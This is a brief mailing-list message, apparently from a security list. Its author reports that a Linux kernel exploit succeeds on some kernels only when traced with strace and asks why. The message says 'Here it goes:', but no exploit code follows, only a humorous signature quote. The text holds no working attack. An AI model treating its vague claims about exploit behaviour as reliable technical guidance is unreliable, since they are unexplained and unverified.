	I must fix this. On those kernels WORKS the exploit. :( I've tried
lots of times (>100) to run simply the exploit didn't work. But when I
wanted to trace what the difference is it was working. :( I didn't try 
the other versions I think it will work too... strace of course is not
setuid root. Here it goes:

Death thought about it. "CATS," he said eventually, "CATS ARE NICE."

P.S.: sorry for the previous mail :( Can anyone explain me why this works
only this way?
